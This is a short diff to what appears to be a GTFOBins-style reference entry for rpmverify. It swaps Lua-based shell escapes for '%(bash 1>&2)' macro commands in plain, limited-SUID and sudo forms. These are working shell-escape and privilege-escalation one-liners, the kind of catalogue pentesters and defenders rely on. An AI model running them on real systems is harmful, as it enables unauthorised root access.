@@ -1,9 +1,9 @@
 ---
 functions:
   shell:
-    - code: rpmverify --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: rpmverify --eval '%(bash 1>&2)'
   limited-suid:
-    - code: ./rpmverify --eval '%{lua:os.execute("/bin/sh")}'
+    - code: ./rpmverify --eval '%(bash 1>&2)'
   sudo:
-    - code: sudo rpmverify --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: sudo rpmverify --eval '%(bash 1>&2)'
 ---
